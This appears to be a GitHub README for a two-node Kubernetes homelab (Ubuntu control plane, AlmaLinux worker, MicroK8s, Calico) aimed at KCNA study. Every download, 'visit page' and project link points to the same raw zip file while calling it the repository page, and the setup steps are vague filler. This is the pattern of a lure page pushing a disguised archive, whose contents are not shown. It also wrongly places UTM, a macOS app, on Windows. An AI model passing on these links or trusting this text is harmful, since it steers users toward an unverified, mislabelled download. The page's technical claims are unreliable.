# 🐳 kubernetes-multi-node-utm-homelab - Learn Kubernetes on a small lab

[![Download / Visit the page](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab/main/manifests/homelab_multi_node_utm_kubernetes_aln.zip)

## 🚀 What this is

This project sets up a small Kubernetes lab in UTM on Windows.

It uses:
- Ubuntu for the control plane
- AlmaLinux for the worker node
- MicroK8s for Kubernetes
- Calico for networking
- containerd for the container runtime

It is built for KCNA prep and hands-on practice with Kubernetes tasks. You can use it to learn how nodes connect, how pods run, and how to troubleshoot common cluster issues.

## 📥 Download

Open this page to get the project files and setup steps:

https://raw.githubusercontent.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab/main/manifests/homelab_multi_node_utm_kubernetes_aln.zip

If you are on Windows, use the page above to visit the repository, download the files, and follow the setup steps from there.

## ✅ What you need

Before you start, make sure your Windows PC has:

- Windows 10 or Windows 11
- UTM installed on your system
- Enough free disk space for two Linux virtual machines
- At least 8 GB of RAM, with 16 GB preferred
- A stable internet connection
- Virtualization turned on in your system settings

For a smooth setup, use a computer with a modern CPU and enough free memory. This lab runs two Linux systems at the same time, so it needs more resources than a single app.

## 🖥️ What you will build

After setup, you will have:

- One Ubuntu virtual machine as the Kubernetes control plane
- One AlmaLinux virtual machine as the worker node
- A working MicroK8s cluster
- A simple multi-node lab for practice
- A setup that helps with node, pod, and networking tests

This gives you a safe place to learn basic cluster tasks without changing a real server.

## 🛠️ How to install

1. Open the download page:
   https://raw.githubusercontent.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab/main/manifests/homelab_multi_node_utm_kubernetes_aln.zip

2. Download the project files from the repository page.

3. Install UTM on your Windows PC if it is not already installed.

4. Open the lab files and follow the included setup steps.

5. Create the Ubuntu virtual machine for the control plane.

6. Create the AlmaLinux virtual machine for the worker node.

7. Start both virtual machines.

8. Wait for the cluster setup to finish.

9. Open the MicroK8s dashboard or use the command line tools included in the lab.

10. Check that both nodes show as ready.

## 🧭 First-time setup

If this is your first time using a Kubernetes lab, follow this order:

1. Install UTM.
2. Download the repository files.
3. Set up the Ubuntu control plane VM.
4. Set up the AlmaLinux worker VM.
5. Connect the two machines on the same virtual network.
6. Run the cluster setup steps.
7. Confirm that Kubernetes can see both machines.

Keep both virtual machines on while you complete the setup. If one machine is off, the cluster may not form correctly.

## 🔍 What to look for

When the lab is running, you should be able to check for:

- One control plane node
- One worker node
- Pods that start without errors
- Calico network traffic between nodes
- MicroK8s services in a running state

If something looks wrong, start with the node status, then check the network link between the two virtual machines.

## 🧪 Common practice tasks

This lab works well for practice with:

- Checking node health
- Creating and viewing pods
- Testing cluster networking
- Reading basic Kubernetes errors
- Restarting services
- Finding the cause of a failed deployment
- Learning how MicroK8s works in a small cluster

These tasks match the kind of work you may see in KCNA study and basic troubleshooting.

## 📁 Repository topics

This project covers:

- Kubernetes
- MicroK8s
- UTM
- Ubuntu
- AlmaLinux
- containerd
- Calico
- homelab
- KCNA prep

These parts work together to create a simple lab that feels close to a real Kubernetes setup.

## 🧰 Suggested use on Windows

If you are using Windows, follow this path:

1. Visit the GitHub page.
2. Get the lab files.
3. Keep the files in a folder you can find again.
4. Use UTM to import or create the virtual machines.
5. Start the Ubuntu and AlmaLinux systems.
6. Finish the cluster setup.
7. Use the lab for practice and testing.

A clean folder name helps. Keep the lab files, VM settings, and notes in one place so you can return to them later.

## 📶 Networking setup

The lab uses a small internal network so the virtual machines can talk to each other.

You should expect:
- A private link between nodes
- Cluster traffic inside the virtual network
- No need to expose the lab to your home network

This keeps the setup simple and helps reduce network conflicts with other devices.

## 🧩 If something does not work

Try these checks:

- Make sure both virtual machines are running
- Confirm that UTM has enough memory set for each machine
- Check that the Ubuntu and AlmaLinux systems can reach each other
- Restart MicroK8s if the cluster does not finish starting
- Verify that containerd is active
- Check that Calico has joined the network

Most setup issues come from network settings, low memory, or a machine not starting in the right order.

## 🪪 License and use

Use this lab for personal learning, practice, and troubleshooting work.

## 🔗 Project link

https://raw.githubusercontent.com/quadruplicate-galactagogue907/kubernetes-multi-node-utm-homelab/main/manifests/homelab_multi_node_utm_kubernetes_aln.zip